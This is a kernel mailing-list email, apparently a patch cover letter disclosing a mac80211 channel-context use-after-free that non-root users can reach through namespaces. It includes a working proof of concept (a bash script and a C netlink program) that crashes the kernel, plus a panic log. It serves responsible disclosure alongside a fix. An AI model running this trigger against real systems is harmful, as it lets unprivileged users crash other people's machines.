Received: from mail-pf1-f176.google.com (mail-pf1-f176.google.com [209.85.210.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 84F7E29992A
	for <linux-wireless@vger.kernel.org>; Mon,  3 Aug 2026 04:35:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785731725; cv=none; b=fEFrGwLEvuPZ75trgZThi6Qxee4PvBNG8IlJVG06QXhqsb44MLAxL6EV0sdtv09J9DrkCNwHIMi6+89atwWHjEKaqyFPG9+3kQ+6ioTifnAAZgMWn8V7oNXChJCeZPt9HLSIITAxHSUpjuZAtA7HbGJNoaYyQ4FpyoqBY6USBXU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785731725; c=relaxed/simple;
	bh=Tux1KA7w3xRZ0DxbnSobm+4Sma10ZPLUfV8TudFBAks=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=SKhFRxa06RKcx+k4iOPBrOsQN4ZO6+y09vHOGq4aLydmP3lkMgMvSXrFt6heOuzQUyWYP7CiIX9i/QKvonwuJX7qH4zarfG94xzHYgdwXoc9yB0GrZ7+Lh9U1exNSvasnsCaa69rolsgbx1uouHh/PuvUnElcfs2Wik68i6Vnss=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=bIxisFwJ; arc=none smtp.client-ip=209.85.210.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="bIxisFwJ"
Received: by mail-pf1-f176.google.com with SMTP id d2e1a72fcca58-84e507b079dso1970900b3a.0
        for <linux-wireless@vger.kernel.org>; Sun, 02 Aug 2026 21:35:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785731723; x=1786336523; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=3g3rq+a/Cisb2Lxn2URF8Z1md+3Ootj39pSXlHCsnAs=;
        b=bIxisFwJyI+wa4Ihe8WzuGyVs2x/VL8AsE4xWx1L24wckV9uKTWKjRVGxPuaOBoDtP
         e/nBzrRts7RL8dYBNQNznUxnlP/qKdeWS57HqqsKwjdsafUPQB9sF8EDi05JDZKpnFHC
         dJSLMQdhTwhP9K/XChCircHh68ENjXDAV4y4zdga96jORKoXX1lAj0vIzCt/wJU199jO
         zCgrWaiPouREZUX/vXYGu/eaBIRePFFuSlfMJ7VEPBD9WxoyOrMMLoSQswCBKotWOjpB
         coaeOk9jd/rBRE9vJ4CquSQlsVwGiBFn/l7nUG6xbCAcaPFXSyC/jFZH1ikt1rA70GwT
         vP5A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785731723; x=1786336523;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=3g3rq+a/Cisb2Lxn2URF8Z1md+3Ootj39pSXlHCsnAs=;
        b=fOQ2jrBzeDcXtcngVIyE0WxWPigvnKZYDLDZc8w6Tbaw6dqC12ViMVZb4MJaGRy9wd
         losFY8zPSHTTw30yI2zFh2NFDu1eFGfQNDIGEpVVsj1nd2ZIjNfOmb1VlD6vwsJokeI2
         Nsb86pcPHVdHMwCf93q/UshqLlEg9Qv8yAysWB+MZkCAzEPh4f4dFjPPpLygoPIMOwSy
         5JCa/4bYX4mJWDmh458XjBG3R0REfXMOFtATMDJN4wfCpaEmWAzD6y7ZrZaPAdLPWDSh
         K6VSGZC7Z1eT6jqkDUGHiVspwre12USV2Yo9Q8hDpplrGDIVTmU4tTMEd2OTxx5BcgV5
         3mwg==
X-Gm-Message-State: AOJu0YyxsXShIQbXBN+8eepQzNCRqgOqd8yMfUzuFDRptKGv6YtFxYSL
	fA7NLdZ/r7kgtrROsvDZOT8NmwtomDWdMvGvfsvMmm05JV8gMgViVBjQJygupH6Ig32Qk2I8Bce
	W3PJGOQ==
X-Gm-Gg: AR+sD10GfSyBldtWMenljOo7GDsTOmPn65YD13/hwUzcW4b5iavG2kZjzBt4vMy9/Fx
	F7zlV6WfyxqfaAjzTzt4fRQRkV46rRwPGkuCRLzBH/3YeDknNpp+nn78zjlMGdqqSmkPpMUnQ/2
	e0hVmdSRXOjfZpsAFJz9RlDIQcMNT7ca5kHoU3/1rjM0Et+MinvAIyPQ3ijy4ozpOg0sInflvuo
	Wz5YssBYQVNJERsKBAu3BFH3y8kkRrgq3U27rzbnRbaSplP0TwFcvshG+ED0w74JmGKHMa+jD6r
	q3V+4o5S9/w11fCJQKsOCUuOtXVcKPvHvf4XEiFSTU9+Kmt4kQ4M0X2IteElrbGim//sqggPuhf
	WsnHehKYDVlcw+ZI9r9Uxj9WLRVcg3DefKnruoH8ddDGnBDpslF4smnS97rQbQNqwBHaCXSf6e3
	vTGSc+vX69FJ6+Mkuzrd3oz+7T1QcEKnsu8oxiRFchWPXYI+t0sqyS+hSgT+jIjc6qPFcv7i1nL
	jrALPAud7Q8Dw==
X-Received: by 2002:a05:6a00:8d6:b0:848:8027:cb6 with SMTP id d2e1a72fcca58-84ee48bc736mr8520855b3a.45.1785731722464;
        Sun, 02 Aug 2026 21:35:22 -0700 (PDT)
Received: from Roxy.localdomain ([202.8.9.242])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edc41ca4dsm3075215b3a.52.2026.08.02.21.35.19
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 02 Aug 2026 21:35:21 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	michal.kazior@tieto.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH wireless 0/1] wifi: mac80211: keep paired old chanctx alive
Date: Mon,  3 Aug 2026 12:35:09 +0800
Message-ID: <cover.1785730815.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,=0D
=0D
We found and validated a issue in net/mac80211/chan.c. The bug is reachable=
 by a=0D
non-root user via user and net namespace.=0D
We've tested it, and it should not affect any other functionality.=0D
=0D
We will provide detailed information about the bug=0D
in this email, along with a PoC to trigger it.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
ieee80211_replace_chanctx() creates reciprocal raw replace_ctx pointers bet=
ween=0D
the old WILL_BE_REPLACED chanctx and the new REPLACES_OTHER chanctx.=0D
=0D
The early free paths only count assigned and reserved link users. That miss=
es=0D
the live replacement-partner relationship, so the old chanctx can be freed =
too=0D
early while the replacement partner still points back to it.=0D
=0D
This can happen when the last assigned link leaves through=0D
__ieee80211_link_release_channel(), and also when it successfully reassigns=
 to=0D
another existing ctx through ieee80211_link_use_reserved_reassign().=0D
=0D
Later unreserve and switch-finalization paths still follow replace_ctx, so =
the=0D
surviving partner can dereference a stale old chanctx pointer.=0D
=0D
Reproducer:=0D
=0D
    chmod +x ~/poc.sh=0D
    unshare -Urn -- bash -lc 'USE_DEFAULT_VIF=3D1 ./poc.sh'=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
=0D
------BEGIN poc.sh------=0D
=0D
#!/bin/bash=0D
set -euo pipefail=0D
=0D
PATH=3D/usr/sbin:/usr/bin:/sbin:/bin=0D
=0D
tag=3D"${TAG:-$$}"=0D
phy=3D"poc${tag}"=0D
ap0=3D"u0${tag}"=0D
ap1=3D"u1${tag}"=0D
base_if=3D""=0D
tmpdir=3D"$(mktemp -d /dev/shm/mac80211-uaf.XXXXXX 2>/dev/null || mktemp -d=
 /tmp/mac80211-uaf.XXXXXX)"=0D
ctrldir=3D"${tmpdir}/hostapd"=0D
cleanup_done=3D0=0D
use_default_vif=3D"${USE_DEFAULT_VIF:-0}"=0D
=0D
cleanup() {=0D
	if (( cleanup_done )); then=0D
		return=0D
	fi=0D
	cleanup_done=3D1=0D
	for pidfile in "${tmpdir}/ap0.pid" "${tmpdir}/ap1.pid"; do=0D
		if [[ -f "${pidfile}" ]]; then=0D
			kill "$(cat "${pidfile}")" 2>/dev/null || true=0D
		fi=0D
	done=0D
	for ifname in "${ap0}" "${ap1}"; do=0D
		ip link del "${ifname}" 2>/dev/null || true=0D
	done=0D
	rm -rf "${tmpdir}"=0D
}=0D
trap cleanup EXIT=0D
=0D
if [[ ! -x ./poc ]]; then=0D
	make=0D
fi=0D
=0D
mkdir -p "${ctrldir}"=0D
=0D
if [[ "${use_default_vif}" =3D=3D "1" ]]; then=0D
	./poc "${phy}" 2 with-vif=0D
else=0D
	./poc "${phy}" 2=0D
fi=0D
=0D
if [[ "${use_default_vif}" =3D=3D "1" ]]; then=0D
	for _ in $(seq 1 50); do=0D
		base_if=3D"$(iw dev | awk '/Interface / { print $2; exit }')"=0D
		if [[ -n "${base_if}" ]]; then=0D
			break=0D
		fi=0D
		sleep 0.1=0D
	done=0D
	if [[ -z "${base_if}" ]]; then=0D
		echo "failed to discover the default hwsim netdev" >&2=0D
		exit 1=0D
	fi=0D
	ap0=3D"${base_if}"=0D
	iw dev "${ap0}" set type __ap=0D
	iw dev "${ap0}" interface add "${ap1}" type __ap=0D
else=0D
	for _ in $(seq 1 50); do=0D
		if iw phy "${phy}" info >/dev/null 2>&1; then=0D
			break=0D
		fi=0D
		sleep 0.1=0D
	done=0D
	iw phy "${phy}" interface add "${ap0}" type __ap=0D
	iw phy "${phy}" interface add "${ap1}" type __ap=0D
fi=0D
=0D
ip link set "${ap0}" up=0D
ip link set "${ap1}" up=0D
=0D
cat > "${tmpdir}/ap0.conf" <<EOF=0D
ctrl_interface=3D${ctrldir}=0D
driver=3Dnl80211=0D
interface=3D${ap0}=0D
ssid=3D${ap0}=0D
hw_mode=3Dg=0D
channel=3D1=0D
beacon_int=3D100=0D
auth_algs=3D1=0D
wmm_enabled=3D0=0D
EOF=0D
=0D
cat > "${tmpdir}/ap1.conf" <<EOF=0D
ctrl_interface=3D${ctrldir}=0D
driver=3Dnl80211=0D
interface=3D${ap1}=0D
ssid=3D${ap1}=0D
hw_mode=3Dg=0D
channel=3D6=0D
beacon_int=3D100=0D
auth_algs=3D1=0D
wmm_enabled=3D0=0D
EOF=0D
=0D
hostapd -B -P "${tmpdir}/ap0.pid" -f "${tmpdir}/ap0.log" "${tmpdir}/ap0.con=
f"=0D
hostapd -B -P "${tmpdir}/ap1.pid" -f "${tmpdir}/ap1.log" "${tmpdir}/ap1.con=
f"=0D
=0D
for _ in $(seq 1 20); do=0D
	if hostapd_cli -p "${ctrldir}" -i "${ap0}" status 2>/dev/null | grep -q '^=
state=3DENABLED$' &&=0D
	   hostapd_cli -p "${ctrldir}" -i "${ap1}" status 2>/dev/null | grep -q '^=
state=3DENABLED$'; then=0D
		break=0D
	fi=0D
	sleep 0.2=0D
done=0D
=0D
hostapd_cli -p "${ctrldir}" -i "${ap0}" chan_switch 100 2462=0D
hostapd_cli -p "${ctrldir}" -i "${ap1}" chan_switch 100 2462=0D
=0D
sleep 1=0D
hostapd_cli -p "${ctrldir}" -i "${ap0}" disable || true=0D
=0D
# The panic is normally immediate. Keep a fallback release for the dependen=
t=0D
# reservation if the first stop only leaves a dangling replace_ctx behind.=
=0D
sleep 3=0D
hostapd_cli -p "${ctrldir}" -i "${ap1}" disable || true=0D
=0D
sleep 1=0D
echo "Trigger sequence completed without an immediate panic."=0D
echo "ap0 log:"=0D
cat "${tmpdir}/ap0.log" || true=0D
echo "ap1 log:"=0D
cat "${tmpdir}/ap1.log" || true=0D
=0D
------END poc.sh--------=0D
=0D
------BEGIN poc.c------=0D
=0D
#include <netlink/genl/ctrl.h>=0D
#include <netlink/genl/genl.h>=0D
#include <netlink/msg.h>=0D
#include <netlink/netlink.h>=0D
#include <stdbool.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
=0D
#define HWSIM_CMD_NEW_RADIO 4=0D
#define HWSIM_ATTR_CHANNELS 9=0D
#define HWSIM_ATTR_RADIO_NAME 17=0D
#define HWSIM_ATTR_NO_VIF 18=0D
=0D
static void die_nl(int err, const char *what)=0D
{=0D
	fprintf(stderr, "%s: %s (%d)\n", what, nl_geterror(err), err);=0D
	exit(1);=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	struct nl_sock *sock;=0D
	struct nl_msg *msg;=0D
	const char *name =3D argc > 1 ? argv[1] : "pocphy";=0D
	unsigned int channels =3D argc > 2 ? strtoul(argv[2], NULL, 0) : 2;=0D
	bool no_vif =3D !(argc > 3 && !strcmp(argv[3], "with-vif"));=0D
	int family;=0D
	int err;=0D
=0D
	sock =3D nl_socket_alloc();=0D
	if (!sock) {=0D
		fprintf(stderr, "nl_socket_alloc failed\n");=0D
		return 1;=0D
	}=0D
=0D
	err =3D genl_connect(sock);=0D
	if (err < 0)=0D
		die_nl(err, "genl_connect");=0D
=0D
	family =3D genl_ctrl_resolve(sock, "MAC80211_HWSIM");=0D
	if (family < 0)=0D
		die_nl(family, "genl_ctrl_resolve");=0D
=0D
	msg =3D nlmsg_alloc();=0D
	if (!msg) {=0D
		fprintf(stderr, "nlmsg_alloc failed\n");=0D
		return 1;=0D
	}=0D
=0D
	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family, 0, 0,=0D
			 HWSIM_CMD_NEW_RADIO, 1)) {=0D
		fprintf(stderr, "genlmsg_put failed\n");=0D
		return 1;=0D
	}=0D
=0D
	err =3D nla_put_u32(msg, HWSIM_ATTR_CHANNELS, channels);=0D
	if (err < 0)=0D
		die_nl(err, "nla_put_u32(HWSIM_ATTR_CHANNELS)");=0D
=0D
	err =3D nla_put_string(msg, HWSIM_ATTR_RADIO_NAME, name);=0D
	if (err < 0)=0D
		die_nl(err, "nla_put_string(HWSIM_ATTR_RADIO_NAME)");=0D
=0D
	if (no_vif) {=0D
		err =3D nla_put_flag(msg, HWSIM_ATTR_NO_VIF);=0D
		if (err < 0)=0D
			die_nl(err, "nla_put_flag(HWSIM_ATTR_NO_VIF)");=0D
	}=0D
=0D
	err =3D nl_send_auto(sock, msg);=0D
	if (err < 0)=0D
		die_nl(err, "nl_send_auto");=0D
=0D
	err =3D nl_wait_for_ack(sock);=0D
	if (err < 0)=0D
		fprintf(stderr, "nl_wait_for_ack warning: %s (%d)\n",=0D
			nl_geterror(err), err);=0D
=0D
	printf("requested radio %s with %u channels\n", name, channels);=0D
	return 0;=0D
}=0D
=0D
------END poc.c--------=0D
=0D
----BEGIN crash log----=0D
=0D
[  692.217994][T11630] Kernel panic - not syncing: kernel: panic_on_warn se=
t ...=0D
[  692.219187][T11630] CPU: 3 UID: 1028 PID: 11630 Comm: hostapd Not tainte=
d 6.12.95 #2=0D
[  692.220295][T11630] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PII=
X, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[  692.221981][T11630] Call Trace:=0D
[  692.222413][T11630]  <TASK>=0D
[  692.222836][T11630]  panic+0x533/0x610=0D
[  692.223460][T11630]  ? __pfx_panic+0x10/0x10=0D
[  692.224176][T11630]  ? ieee80211_del_chanctx+0x35a/0x400=0D
[  692.224895][T11630]  check_panic_on_warn+0x61/0x80=0D
[  692.225571][T11630]  __warn+0xdf/0x2e0=0D
[  692.226120][T11630]  ? ieee80211_del_chanctx+0x35a/0x400=0D
[  692.226850][T11630]  report_bug+0x308/0x3d0=0D
[  692.227502][T11630]  handle_bug+0x111/0x150=0D
[  692.228101][T11630]  exc_invalid_op+0x17/0x50=0D
[  692.228690][T11630]  asm_exc_invalid_op+0x1a/0x20=0D
[  692.229347][T11630] RIP: 0010:ieee80211_del_chanctx+0x35a/0x400=0D
[  692.230200][T11630] Code: 87 2c 60 06 00 0f 85 e1 fd ff ff c6 05 7a 2c 6=
0 06 01 90 48 c7 c7 80 19 ce 8b e8 11 5a 70 f7 90 0f 0b 90 90 e9 c3 fd ff f=
f 90 <0f> 0b 90 4d 8d b4 24 a0 00 00 00 e9 51 fe ff ff 90 0f 0b 90 e9 82=0D
[  692.232786][T11630] RSP: 0018:ffffc900125cf330 EFLAGS: 00010246=0D
[  692.233593][T11630] RAX: 0000000000000000 RBX: ffff888060878e80 RCX: 000=
0000000000001=0D
[  692.234648][T11630] RDX: 0000000000000004 RSI: ffffffff8a8c49a0 RDI: fff=
fffff8aee7960=0D
[  692.235677][T11630] RBP: ffff888101b52654 R08: ffff88806087aaf8 R09: fff=
f88807d4eb800=0D
[  692.236709][T11630] R10: ffff888061ec56b7 R11: ffff888060878ec0 R12: fff=
f888101b52600=0D
[  692.237785][T11630] R13: 0000000000000000 R14: ffff888101b52620 R15: fff=
f88806087aaf8=0D
[  692.238889][T11630]  ieee80211_vif_use_reserved_switch+0x1358/0x1ea0=0D
[  692.239787][T11630]  ? __ieee80211_link_release_channel+0x451/0x4b0=0D
[  692.240672][T11630]  ieee80211_stop_ap+0xa0d/0x14d0=0D
[  692.241426][T11630]  ? __pfx_ieee80211_stop_ap+0x10/0x10=0D
[  692.242172][T11630]  ? trace_kmalloc+0x2b/0xe0=0D
[  692.242788][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.243562][T11630]  ___cfg80211_stop_ap+0x227/0x870=0D
[  692.244331][T11630]  genl_family_rcv_msg_doit+0x1e5/0x2d0=0D
[  692.245090][T11630]  ? __pfx_genl_family_rcv_msg_doit+0x10/0x10=0D
[  692.245885][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.246826][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.247734][T11630]  ? apparmor_capable+0xb9/0x180=0D
[  692.248575][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.249515][T11630]  ? security_capable+0x8a/0x150=0D
[  692.250325][T11630]  genl_rcv_msg+0x42d/0x6f0=0D
[  692.251107][T11630]  ? __pfx_genl_rcv_msg+0x10/0x10=0D
[  692.251913][T11630]  ? __pfx_nl80211_pre_doit+0x10/0x10=0D
[  692.252913][T11630]  ? __pfx_nl80211_stop_ap+0x10/0x10=0D
[  692.253725][T11630]  ? __pfx_nl80211_post_doit+0x10/0x10=0D
[  692.254664][T11630]  ? __pfx___lock_acquire+0x10/0x10=0D
[  692.255547][T11630]  ? find_held_lock+0x2d/0x110=0D
[  692.256402][T11630]  netlink_rcv_skb+0x136/0x370=0D
[  692.257141][T11630]  ? __pfx_genl_rcv_msg+0x10/0x10=0D
[  692.257995][T11630]  ? __pfx_lock_acquire.part.0+0x10/0x10=0D
[  692.258945][T11630]  ? __pfx_netlink_rcv_skb+0x10/0x10=0D
[  692.259842][T11630]  ? rwsem_read_trylock+0x130/0x250=0D
[  692.260748][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.261726][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.262656][T11630]  ? down_read+0xcc/0x330=0D
[  692.263437][T11630]  ? __pfx_down_read+0x10/0x10=0D
[  692.264216][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.265197][T11630]  ? netlink_deliver_tap+0x14b/0xa80=0D
[  692.265948][T11630]  genl_rcv+0x28/0x40=0D
[  692.266660][T11630]  netlink_unicast+0x479/0x790=0D
[  692.267503][T11630]  ? __pfx_netlink_unicast+0x10/0x10=0D
[  692.268295][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.269277][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.270139][T11630]  ? __check_object_size+0x2eb/0x4f0=0D
[  692.271009][T11630]  netlink_sendmsg+0x76e/0xc10=0D
[  692.271736][T11630]  ? __pfx_netlink_sendmsg+0x10/0x10=0D
[  692.272717][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.273593][T11630]  ? apparmor_socket_sendmsg+0x2e/0x200=0D
[  692.274540][T11630]  ____sys_sendmsg+0x818/0xa10=0D
[  692.275337][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.276234][T11630]  ? __pfx_____sys_sendmsg+0x10/0x10=0D
[  692.277099][T11630]  ? __pfx_copy_msghdr_from_user+0x10/0x10=0D
[  692.278070][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.278918][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.279855][T11630]  ? find_held_lock+0x2d/0x110=0D
[  692.280665][T11630]  ___sys_sendmsg+0x105/0x190=0D
[  692.281636][T11630]  ? __pfx_lock_release+0x10/0x10=0D
[  692.282474][T11630]  ? __pfx____sys_sendmsg+0x10/0x10=0D
[  692.283479][T11630]  ? __might_fault+0xb6/0x120=0D
[  692.284327][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.285336][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.286179][T11630]  ? do_sock_setsockopt+0x1ca/0x3b0=0D
[  692.287037][T11630]  ? __pfx_do_sock_setsockopt+0x10/0x10=0D
[  692.287881][T11630]  ? find_held_lock+0x2d/0x110=0D
[  692.288702][T11630]  __sys_sendmsg+0x122/0x1b0=0D
[  692.289458][T11630]  ? __pfx___sys_sendmsg+0x10/0x10=0D
[  692.290366][T11630]  ? srso_alias_return_thunk+0x5/0xfbef5=0D
[  692.291344][T11630]  do_syscall_64+0xc7/0x270=0D
[  692.292109][T11630]  entry_SYSCALL_64_after_hwframe+0x77/0x7f=0D
[  692.293131][T11630] RIP: 0033:0x7f2f6b09b687=0D
[  692.293940][T11630] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 0=
0 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0=
f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff=0D
[  692.296916][T11630] RSP: 002b:00007ffce9a23730 EFLAGS: 00000202 ORIG_RAX=
: 000000000000002e=0D
[  692.298264][T11630] RAX: ffffffffffffffda RBX: 00007f2f6b8db740 RCX: 000=
07f2f6b09b687=0D
[  692.299545][T11630] RDX: 0000000000000000 RSI: 00007ffce9a237b0 RDI: 000=
0000000000005=0D
[  692.300822][T11630] RBP: 00005565239d7550 R08: 0000000000000000 R09: 000=
0000000000000=0D
[  692.302169][T11630] R10: 0000000000000000 R11: 0000000000000202 R12: 000=
05565239d2030=0D
[  692.303395][T11630] R13: 00007ffce9a237b0 R14: 0000000000000000 R15: 000=
07ffce9a23894=0D
[  692.304731][T11630]  </TASK>=0D
[  692.305856][T11630] Kernel Offset: disabled=0D
[  692.306542][T11630] Rebooting in 86400 seconds..=0D
=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Zhiling Zou=0D
=0D
Zhiling Zou (1):=0D
  wifi: mac80211: keep paired old chanctx alive=0D
=0D
 net/mac80211/chan.c | 20 ++++++++++++++++++--=0D
 1 file changed, 18 insertions(+), 2 deletions(-)=0D
=0D
-- =0D
2.43.0=0D
=0D
